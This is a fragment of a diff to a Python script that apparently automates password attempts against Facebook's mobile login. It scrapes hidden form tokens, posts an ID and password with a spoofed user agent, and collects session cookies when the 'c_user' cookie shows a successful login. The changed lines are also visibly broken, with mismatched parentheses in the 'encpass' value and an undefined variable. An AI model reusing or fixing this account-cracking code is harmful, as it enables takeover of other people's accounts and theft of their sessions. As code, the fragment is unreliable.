-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":idf,
-            "pass":ps,
-            "login":"Log In"}
+   free_fb = session.get('https://m.facebook.com').text
+   log_data = {'jazoest': re.search('name="jazoest" value="(.*?)"',str(free_fb.text)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"',str(free_fb.text)).group(1),
+            'email': idf,
+            'login_source': 'comet_headerless_login',
+            'next': '',
+            'encpass': '#PWD_BROWSER:5:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1)),ps,}
    header_freefb = {
-            'authority': 'mobile.facebook.com/',
-            'method': 'POST',
+            'authority': 'm.facebook.com',
+            'method': 'GET',
             'path': '/login/device-based/login/async/',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;',
@@ -1264,8 +1235,8 @@ def m6(idf,pwv):
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
             'upgrade-insecure-requests': '1',
-            'user-agent':'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFASWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36',} #'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
-   lo = session.post('https://mobile.facebook.com/login.php?next=https%3A%2F%2Fmobile.facebook.com%2Fhome.php&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
+   lo = session.post('https://m.facebook.com/login/device-based/login/async/?',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
